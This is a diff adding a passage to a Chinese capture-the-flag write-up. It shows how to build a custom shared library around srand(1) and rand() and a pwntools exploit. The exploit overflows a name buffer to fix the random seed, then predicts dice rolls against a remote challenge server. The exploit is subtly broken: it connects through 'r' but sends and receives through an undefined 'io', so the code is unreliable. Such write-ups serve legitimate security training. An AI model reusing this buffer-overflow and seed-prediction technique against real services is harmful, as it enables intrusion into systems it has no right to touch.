@@ -80,3 +80,49 @@ io.interactive()
 
 其中so文件的路径是通过`ldd`工具找到的。
 
+在这里，如果我们的开发环境不是在linux下，比如我是在MAC下，那么我们怎么去获得这个so文件呐。
+
+既然没有，那我们是不是可以自己写一个呐，说干就干。
+
+```c
+#include<stdio.h>
+#include<stdlib.h>
+
+void srand1(){
+  srand(1);
+}
+
+int rand1(){
+  return rand();
+}
+
+```
+
+然后通过gcc编译成一个so文件。
+
+```shell
+gcc -fPIC -shared g_rand.c -o g_rand.so
+```
+
+然后我们在exp中，将文件的路劲改为我们生成的so文件，调用变为我们自己的函数，也可以实现。
+
+```python
+from pwn import *
+from ctypes import *
+
+libc = cdll.LoadLibrary('./g_rand.so')
+libc.srand1()
+payload = 'A' * 0x20 + p64(1).decode()
+r = remote('111.198.29.45', 57255)
+r.recvuntil('name:')
+r.sendline(payload)
+for i in range(10):
+    num = str(libc.rand1() % 6 + 1)
+    io.recvuntil('number:')
+    io.sendline(num)
+
+io.interactive()
+
+
+```
+
